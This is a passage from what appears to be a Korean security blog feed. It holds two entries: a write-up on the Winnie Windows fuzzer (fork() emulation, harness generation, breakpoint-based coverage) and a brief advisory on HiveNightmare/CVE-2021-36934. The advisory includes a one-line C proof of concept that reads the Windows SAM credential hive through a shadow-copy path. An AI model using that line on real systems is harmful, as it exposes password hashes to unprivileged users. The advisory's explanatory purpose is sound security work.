&#xBB38;&#xC81C;&#xC810;"></a>Windows &#xD658;&#xACBD;&#xC758; Fuzzing &#xBB38;&#xC81C;&#xC810;</h1><p><img src="/2021/07/25/fabu1ous/winnie-1/2.png" alt></p><p>&#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xC758; &#xC885;&#xB958;&#xB294; &#xC815;&#xB9D0; &#xB2E4;&#xC591;&#xD569;&#xB2C8;&#xB2E4;. Windows, Mac, Linux, Android, &#xBD89;&#xC740;&#xBCC4;&#x2026; &#xADF8; &#xC911; Windows&#xAC00; &#xC57D; 73%&#xB77C;&#xB294; &#xC555;&#xB3C4;&#xC801;&#xC778; &#xC2DC;&#xC7A5; &#xC810;&#xC720;&#xC728;&#xC744; &#xAC16;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9CC;&#xD07C; Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xC758; Product security&#xAC00; &#xC911;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xC758; Fuzzing&#xC740; &#xBA87; &#xAC00;&#xC9C0; &#xC7A5;&#xC560;&#xBB3C;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>GUI</p><p>&#xC2E4;&#xC81C;&#xB85C; &#xD37C;&#xC9D5; &#xD558;&#xAC8C; &#xB420; &#xCF54;&#xC5B4; &#xB8E8;&#xD2F4; &#xC55E; &#xB4A4;&#xB85C; User interaction&#xC744; &#xB2F4;&#xB2F9;&#xD558;&#xB294; GUI&#xAC00; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; User interaction&#xC744; &#xC7AC;&#xD604;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xC791;&#xC5C5;&#xC774; &#xD544;&#xC694;&#xD558;&#xACE0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC885;&#xB8CC;&#xC2DC;&#xD0AC; &#xC2DC;&#xC810;&#xC744; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xBCC4;&#xB3C4;&#xC758; &#xB3D9;&#xC791;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. User interaction&#xC744; &#xC7AC;&#xD604;&#xD558;&#xB824;&#xB294; &#xC2DC;&#xB3C4;&#xAC00; &#xC788;&#xC9C0;&#xB9CC; &#xC18D;&#xB3C4; &#xC800;&#xD558; &#xBB38;&#xC81C;&#xB85C; &#xD070; &#xC131;&#xACFC;&#xB294; &#xC5C6;&#xB294; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>Lack of fast cloning</p><p>Windows&#xB294; <code>fork()</code>&#xC640; &#xAC19;&#xC740; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC774; &#xBBF8;&#xD761;&#xD569;&#xB2C8;&#xB2E4;. Linux&#xB294;  <code>fork()</code>&#xB97C; &#xD1B5;&#xD574; &#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC640; &#xB3D9;&#xC77C;&#xD55C; &#xB610; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xBE60;&#xB974;&#xAC8C; &#xBCF5;&#xC81C;&#xD574; &#xD37C;&#xC9D5;&#xC744; &#xC774;&#xC5B4;&#xB098;&#xAC00;&#xC9C0;&#xB9CC; Windows&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xB2E4;&#xC2DC; startup &#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAC19;&#xC740; Persistent mode fuzzing&#xC774;&#xB77C;&#xACE0; &#xBD80;&#xB974;&#xC9C0;&#xB9CC; Unix-like&#xC640; Windows &#xC0AC;&#xC774;&#xC5D0; &#xCC28;&#xC774;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>Closed-source</p><p>&#xD604;&#xC874;&#xD558;&#xB294; &#xD37C;&#xC9D5; &#xAE30;&#xC220;&#xB4E4;&#xC774; Unix-like &#xC6B4;&#xC601;&#xCCB4;&#xC81C; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xBC1C;&#xC804;&#xD574;&#xC654;&#xACE0; Windows&#xC5D0; &#xC801;&#xC6A9;&#xD558;&#xB294;&#xB370; &#xD55C;&#xACC4;&#xAC00; &#xC788;&#xB294; &#xAC00;&#xC7A5; &#xD070; &#xC774;&#xC720;&#xAC00; &#xC544;&#xB2D0;&#xAE4C; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;. Windows&#xB294; Closed-source ecosystem&#xC758; &#xD2B9;&#xC131;&#xC0C1; &#xB0B4;&#xBD80; context&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xB294;&#xB370; &#xC5B4;&#xB824;&#xC6C0;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; 2006&#xB144;, &#xCF54;&#xB4DC; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0;&#xC5D0; &#xAE30;&#xBC18;&#xD55C; &#xD37C;&#xC9D5; &#xBC29;&#xBC95;&#xB860;&#xC774; &#xC81C;&#xC2DC;&#xB41C; &#xC774;&#xD6C4; &#xD37C;&#xC9D5;&#xC758; &#xC911;&#xC2EC; &#xAC1C;&#xB150;&#xC73C;&#xB85C; &#xC790;&#xB9AC; &#xC7A1;&#xAC8C; &#xB418;&#xC5C8;&#xB294;&#xB370; Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; DynamoRIO&#xB098; IntelPT &#xAE30;&#xC220;&#xC744; &#xC811;&#xBAA9;&#xD574;&#xC57C; &#xD558;&#xB294; &#xB4F1;&#xC758; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul><h1 id="&#xAE30;&#xC874;-&#xD574;&#xACB0;&#xBC95;"><a href="#&#xAE30;&#xC874;-&#xD574;&#xACB0;&#xBC95;" class="headerlink" title="&#xAE30;&#xC874; &#xD574;&#xACB0;&#xBC95;"></a>&#xAE30;&#xC874; &#xD574;&#xACB0;&#xBC95;</h1><p><img src="/2021/07/25/fabu1ous/winnie-1/3.png" alt></p><ul><li><p>Harness &#xC791;&#xC131;</p><p>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xCF54;&#xC5B4; &#xB8E8;&#xD2F4;&#xB9CC;&#xC744; &#xCD94;&#xCD9C;&#xD574; Harness&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; GUI&#xB97C; &#xC0DD;&#xB7B5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD37C;&#xC9D5; &#xD558;&#xB294; &#xC804;&#xCCB4; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xD06C;&#xAE30;&#xB97C; &#xC904;&#xC5EC; &#xC18D;&#xB3C4; &#xBA74;&#xC5D0;&#xC11C;&#xB3C4; &#xC774;&#xB4DD;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC8E0;. &#xD558;&#xC9C0;&#xB9CC; &#xC800;&#xBC88; &#xC2DC;&#xB9AC;&#xC988;&#xC5D0;&#xC11C; &#xC81C;&#xAC00; WinAFL&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; Harness&#xB97C; &#xC791;&#xC131;&#xD558;&#xBA74;&#xC11C; &#xC815;&#xB9D0; &#xACE8;&#xBA38;&#xB9AC;&#xB97C; &#xC553;&#xC558;&#xC8E0;. Harness&#xB97C; &#xC791;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD544;&#xC694;&#xD55C; &#xC815;&#xBCF4; &#xC218;&#xC9D1;&#xBD80;&#xD130; &#xC26C;&#xC6B4; &#xC77C;&#xC774; &#xC544;&#xB2C8;&#xBA70; &#xD14C;&#xC2A4;&#xD2B8;&#xC640; &#xC218;&#xC815;&#xB3C4; &#xC5EC;&#xB7EC; &#xBC88; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2EC;&#xC9C0;&#xC5B4; &#xC81C;&#xAC00; &#xC791;&#xC131;&#xD55C; Harness&#xB294; &#xCD5C;&#xB300;&#xD55C; &#xB0A0;&#xB85C; &#xBA39;&#xC744; &#xC218; &#xC788;&#xB294; &#xC218;&#xC900;&#xC73C;&#xB85C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC791;&#xC131;&#xD55C; &#xAC81;&#xB2C8;&#xB2E4;. &#xC2E0;&#xC18D;&#xD558;&#xACE0; &#xC815;&#xD655;&#xD55C; Harness&#xB97C; &#xB9CC;&#xB4E4;&#xAE30; &#xC704;&#xD574;&#xC120; &#xB300;&#xB2E8;&#xD55C; &#xB178;&#xB825;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>persistent fuzzing</p><p>&#xB9E4; iteration &#xB9C8;&#xB2E4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; startup &#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC740; &#xC18D;&#xB3C4; &#xC800;&#xD558;&#xAC00; &#xC2EC;&#xD569;&#xB2C8;&#xB2E4;. Loop&#xB97C; &#xD1B5;&#xD574; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xCD08;&#xAE30; &#xC0C1;&#xD0DC;&#xB85C; &#xB418;&#xB3CC;&#xB9AC;&#xB294; persistent mode fuzzing&#xC744; &#xD1B5;&#xD574; &#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xACE0; &#xC788;&#xC8E0;. &#xD558;&#xC9C0;&#xB9CC; persistent mode&#xB3C4; &#xC644;&#xBCBD;&#xD55C; &#xAC83;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xAC01; iteration &#xB9C8;&#xB2E4; &#xC870;&#xAE08;&#xC529; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; global state&#xAC00; &#xC624;&#xC5FC;&#xB418;&#xACE0;, &#xB530;&#xB77C;&#xC11C; &#xC77C;&#xC815; iteration&#xC774; &#xC9C0;&#xB098;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC7AC;&#xC2DC;&#xC791;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC704;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xD55C;&#xB300;&#xB85C; Unix-like&#xB294; <code>fork()</code>&#xB97C; &#xD1B5;&#xD574; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xBCF5;&#xC81C;&#xD558;&#xC9C0;&#xB9CC; Windows&#xB294; &#xB2E4;&#xC2DC; &#xCC98;&#xC74C;&#xBD80;&#xD130; startup &#xD574;&#xC57C; &#xD558;&#xB294; &#xCC28;&#xC774;&#xB97C; &#xAC16;&#xC2B5;&#xB2C8;&#xB2E4;. <code>fork()</code>&#xC758; &#xACBD;&#xC6B0; &#xAC01; child process &#xB9C8;&#xB2E4; &#xB3C5;&#xC790;&#xC801;&#xC778; address space&#xB97C; &#xAC16;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; crash&#xB098; hang&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xB294;&#xB370; &#xC880; &#xB354; &#xC548;&#xC815;&#xC801;&#xC785;&#xB2C8;&#xB2E4;.</p></li></ul><h1 id="&#xADF8;&#xB798;&#xC11C;-Winnie&#xB294;"><a href="#&#xADF8;&#xB798;&#xC11C;-Winnie&#xB294;" class="headerlink" title="&#xADF8;&#xB798;&#xC11C; Winnie&#xB294;"></a>&#xADF8;&#xB798;&#xC11C; Winnie&#xB294;</h1><p><img src="/2021/07/25/fabu1ous/winnie-1/4.png" alt></p><ul><li><p>Semi-automated harness generation</p><p>User interaction&#xACFC; termination &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC791;&#xC131;&#xD558;&#xB358; Harness&#xB97C; &#xC54C;&#xC544;&#xC11C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC90D;&#xB2C8;&#xB2E4;.</p></li><li><p>Windows version of <code>fork()</code> mechanism</p><p>&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC0DD;&#xC131; &#xACFC;&#xC815;&#xC744; &#xB9AC;&#xBC84;&#xC2F1; &#xD574; <code>fork()</code>&#xB97C; Windows&#xB85C; &#xD3EC;&#xD305;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>Hybrid analysis and fullspeed fuzzing</p><p>&#xAD6C;&#xD604;&#xB41C; <code>fork()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; basic block &#xB2E8;&#xC704; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0; &#xAE30;&#xB85D;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p></li></ul><h1 id="Semi-automated-harness-generator"><a href="#Semi-automated-harness-generator" class="headerlink" title="Semi-automated harness generator"></a>Semi-automated harness generator</h1><p><img src="/2021/07/25/fabu1ous/winnie-1/5.png" alt></p><p><s>&#xBC18;&#xC790;&#xB3D9; &#xC18C;&#xCD1D; &#xC544;&#xB2C8;&#xAD6C;&#xC694;. &#xBC18;&#xC790;&#xB3D9; &#xD558;&#xB124;&#xC2A4; &#xC0DD;&#xC131;&#xAE30; &#xC785;&#xB2C8;&#xB2E4;.</s></p><p>Winnie&#xB294; &#xD06C;&#xAC8C; Harness generator&#xC640; Fuzzer&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911; &#xCCAB; &#xBC88;&#xC9F8;&#xC778; Harness generator&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>Trace collector</p><p>Run trace&#xB97C; &#xCEA1;&#xCC98;&#xD558;&#xB294; Trace collector&#xC785;&#xB2C8;&#xB2E4;. &#xBA54;&#xC778; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xACFC; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;, &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC640; API &#xAC04;&#xC758; &#xAD50;&#xB958;&#xB97C; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD558;&#xACE0; &#xB364;&#xD551; &#xD569;&#xB2C8;&#xB2E4;. API call, Argument Value, Retrun Value&#xB97C; &#xC218;&#xC9D1;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>Target extractor</p><p>&#xD0C0;&#xAC9F; &#xD568;&#xC218; &#xD6C4;&#xBCF4;&#xB97C; &#xC120;&#xC815;&#xD558;&#xB294; Target extractor&#xC785;&#xB2C8;&#xB2E4;. Dynamic Launch trace&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xACE0; &#xADF8;&#xB85C;&#xBD80;&#xD130; control flow gragh&#xB97C; &#xC7AC;&#xAD6C;&#xC131; &#xD569;&#xB2C8;&#xB2E4;. <code>CreateFile</code> &#xB610;&#xB294; <code>ReadFile</code>&#xACFC; &#xAC19;&#xC774; &#xC911;&#xC694;&#xD55C; API&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xB294; &#xD568;&#xC218;&#xB97C; &#xD37C;&#xC9D5; &#xD6C4;&#xBCF4;&#xB85C; &#xC120;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>Harness Builder</p><p>&#xC120;&#xC815;&#xB41C; &#xD0C0;&#xAC9F; &#xD568;&#xC218; &#xD6C4;&#xBCF4;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; Harness&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; Harness builder&#xC785;&#xB2C8;&#xB2E4;. &#xD37C;&#xC9D5; &#xD6C4;&#xBCF4;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xC815;&#xD55C; &#xD6C4; valid input&#xACFC; invalid input&#xC744; &#xC0AC;&#xC6A9;&#xD574; run trace &#xC218;&#xC9D1;&#xD558;&#xACE0; differential analysis&#xB97C; &#xD1B5;&#xD574; &#xBD84;&#xC11D;&#xD569;&#xB2C8;&#xB2E4;. Valid input&#xC744; &#xC0AC;&#xC6A9;&#xD55C; run trace &#xB07C;&#xB9AC; &#xBE44;&#xAD50;&#xD558;&#xBA74; ASLR &#xB54C;&#xBB38;&#xC5D0; &#xB2EC;&#xB77C;&#xC9C4; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; Valid input&#xC744; &#xC0AC;&#xC6A9;&#xD55C; run trace&#xC640; invalid input&#xC744; &#xC0AC;&#xC6A9;&#xD55C; run trace&#xB97C; &#xBE44;&#xAD50;&#xD574; &#xCF54;&#xC5B4; &#xB85C;&#xC9C1;&#xC744; &#xCD94;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. Harness &#xC790;&#xB3D9; &#xC0DD;&#xC131;&#xACFC; &#xD3C9;&#xAC00; &#xACFC;&#xC815;&#xC740; &#xB17C;&#xBB38;&#xC758; &#xC911;&#xC2EC; &#xB0B4;&#xC6A9;&#xC73C;&#xB85C; &#xC81C;&#xAC00; &#xC124;&#xBA85;&#xD558;&#xAE30;&#xC5D4; &#xBC85;&#xCC28;&#xB354;&#xB77C;&#xACE0;&#xC694;&#x2026; &#x314E;&#x314E;. &#xC77C;&#xB2E8; &#xAC04;&#xB2E8;&#xD788; &#xC54C;&#xC544;&#xBCF4;&#xACE0; &#xC9C1;&#xC811; &#xC0AC;&#xC6A9;&#xD574;&#xBCF4;&#xB294; &#xAC8C; &#xBAA9;&#xC801;&#xC774;&#xB77C; &#xC774; &#xAE00;&#xC5D0;&#xC120; &#xB2E4;&#xB8E8;&#xC9C0; &#xC54A;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul><h1 id="Fuzzer"><a href="#Fuzzer" class="headerlink" title="Fuzzer"></a>Fuzzer</h1><p>&#xB17C;&#xBB38;&#xC5D0;&#xC120; &#xCF54;&#xB4DC; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0; &#xC218;&#xC9D1;&#xC744; &#xC704;&#xD55C; Fullspeed fuzzing &#xAE30;&#xB2A5;&#xC744; &#xC18C;&#xAC1C;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Basic block &#xB2E8;&#xC704;&#xB85C; s/w break point&#xB97C; &#xC124;&#xC815;&#xD558;&#xACE0; input&#xC774; &#xC0C8;&#xB85C;&#xC6B4; basic block&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xBA74; break point &#xC778;&#xD130;&#xB7FD;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0;&#xB97C; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/25/fabu1ous/winnie-1/6.png" alt></p><p>&#xCC45;&#xC744; &#xBCF4;&#xBA74;&#xC11C; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xACF5;&#xBD80;&#xB97C; &#xC7A0;&#xC2DC; &#xD588;&#xC5C8;&#xB294;&#xB370; &#xC5EC;&#xAE30;&#xC11C; &#xAD49;&#xC7A5;&#xD788; &#xC758;&#xC544;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC704;&#xD0A4;&#xD53C;&#xB514;&#xC544;&#xC5D0; &#xB530;&#xB974;&#xBA74; basic block&#xC758; &#xC815;&#xC758;&#xAC00; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC74C;&#xC744; &#xC0DD;&#xAC01;&#xD574; &#xBCF4;&#xBA74; &#xC5C4;&#xCCAD;&#xB09C; &#xC18D;&#xB3C4; &#xC800;&#xD558;&#xB97C; &#xC608;&#xC0C1;&#xD558;&#xC2E4; &#xC218;&#xB3C4; &#xC788;&#xB294;&#xB370;, (Control flow gragh&#xB97C; &#xADF8;&#xB9AC;&#xB294; &#xAE30;&#xBCF8; &#xB2E8;&#xC704; &#xC815;&#xB3C4;&#xB85C; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.)</p><blockquote><p>a straight-line code sequence with no branches in except to the entry and no branches out except at the exit</p></blockquote><p>&#xD55C;&#xBC88; &#xC778;&#xD130;&#xB7FD;&#xD2B8;&#xAC00; &#xBC1C;&#xC0DD;&#xD55C; break point&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xAC19;&#xC740; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0;&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xB294; &#xC77C;&#xC744; &#xC5C6;&#xC560;&#xACE0; &#xC0C8;&#xB85C;&#xC6B4; basic block&#xC5D0; &#xB3C4;&#xB2EC;&#xD560; &#xB54C;&#xB9CC; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; <code>fork()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xBCF5;&#xC81C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; break point&#xB97C; &#xC0BD;&#xC785;&#xACFC; &#xBE44;&#xD65C;&#xC131;&#xD654; &#xC791;&#xC5C5;&#xC744; &#xC0C8;&#xB85C;&#xC6B4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC801;&#xC6A9;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/25/fabu1ous/winnie-1/7.png" alt></p><p>Winnie&#xC57C; &#xB108;&#xB294; <code>fork()</code>&#xAC00; &#xC788;&#xAD6C;&#xB098;!</p><p>Winnie&#xB294; &#xD604;&#xC874;&#xD558;&#xB294; &#xB2E4;&#xB978; &#xC194;&#xB8E8;&#xC158;&#xBCF4;&#xB2E4; &#xC57D; 310% &#xC815;&#xB3C4; &#xCF54;&#xB4DC; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0;&#xAC00; &#xB192;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC120; Winnie&#xC758; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB97C; &#xD6D1;&#xC5B4;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xD37C;&#xC800;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xACE0; &#xC0AC;&#xC6A9;&#xB9CC; &#xD574;&#xBD24;&#xC9C0; &#xB17C;&#xBB38;&#xAE4C;&#xC9C0; &#xC77D;&#xC73C;&#xBA74;&#xC11C; &#xAE4A;&#xAC8C; &#xC54C;&#xC544;&#xBCF8; &#xAC74; &#xCC98;&#xC74C;&#xC774;&#xB124;&#xC694;. &#xBB3C;&#xB860; &#xC774; &#xC815;&#xB3C4;&#xB3C4; &#xAC89; &#xD561;&#xAE30;&#xC774;&#xAE34; &#xD558;&#xC9C0;&#xB9CC; &#x314E;&#x314E;. &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xCF54;&#xB4DC; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0; &#xAC1C;&#xB150;&#xACFC; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xC774;&#xB860; &#xBCF5;&#xC2B5;&#xB3C4; &#xD558;&#xB294; &#xACC4;&#xAE30;&#xAC00; &#xB410;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC10;&#xC0AC;&#xD558;&#xAC8C;&#xB3C4; Winnie&#xB294; github&#xC5D0; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC120; &#xD658;&#xACBD; &#xC124;&#xC815;&#xC744; &#xD574;&#xBCF4;&#xACE0; &#xC9C1;&#xC811; &#xC0AC;&#xC6A9;&#xD574; &#xBD10;&#xC57C;&#xACA0;&#xC8E0;? Winnie&#xAC00; Harness&#xB97C; &#xC54C;&#xC544;&#xC11C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC900;&#xB2E4;&#xACE0;&#xB294; &#xD588;&#xB294;&#xB370; &#xD138; &#xB05D; &#xD558;&#xB098; &#xC815;&#xB3C4;&#xB294; &#xC870;&#xAE08; &#xC190;&#xBD10;&#xC57C; &#xD55C;&#xB2E4;&#xACE0; &#xADF8;&#xB7EC;&#xB124;&#xC694;.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>fuzzing</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>harness</tag>
      
      <tag>bug bounty</tag>
      
      <tag>winnie</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] HiveNightmare aka SeriousSAM — anybody can read the registry in Windows 10</title>
    <link href="/2021/07/23/j0ker/2021-07-16-23/"/>
    <url>/2021/07/23/j0ker/2021-07-16-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5">https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows&#xC5D0;&#xC11C; Shadow Volume&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC744; &#xB54C;, Shadow Copy&#xC744; &#xD1B5;&#xD574; &#xC77C;&#xBC18; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C; &#xC77D;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>POC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">hFile = CreateFile(TEXT(&#x201C;\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\System32\\\\config\\\\SAM&#x201D;),GENERIC_READ, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);</code></pre><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC815;&#xD655;&#xD55C; &#xC6D0;&#xC778;&#xC740; &#xBD84;&#xC11D;&#xB418;&#xACE0; &#xC54A;&#xC558;&#xC9C0;&#xB9CC; SAM &#xD30C;&#xC77C;&#xC5D0; &#xC788;&#xB294; BUILTIN\Users&#xC758; &#xC77D;&#xAE30; &#xAD8C;&#xD55C;&#xC744; &#xBE8C;&#xC73C;&#xB85C;&#xC368; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD65C;&#xC6A9;&#xB418;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD328;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBA70; CVE-2021-36934&#xB97C; &#xD560;&#xB2F9; &#xBC1B;&#xACE0; &#xD328;&#xCE58; &#xC9C4;&#xD589; &#xC911;&#xC5D0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>eop</tag>
      
      <tag>j0ker</tag>
      
      <tag>sam</tag>
      
      <tag>hivenightmare</tag>
      
      <tag>serioussam</tag>
      
      <tag>registry</tag>
      
    </tags>
    
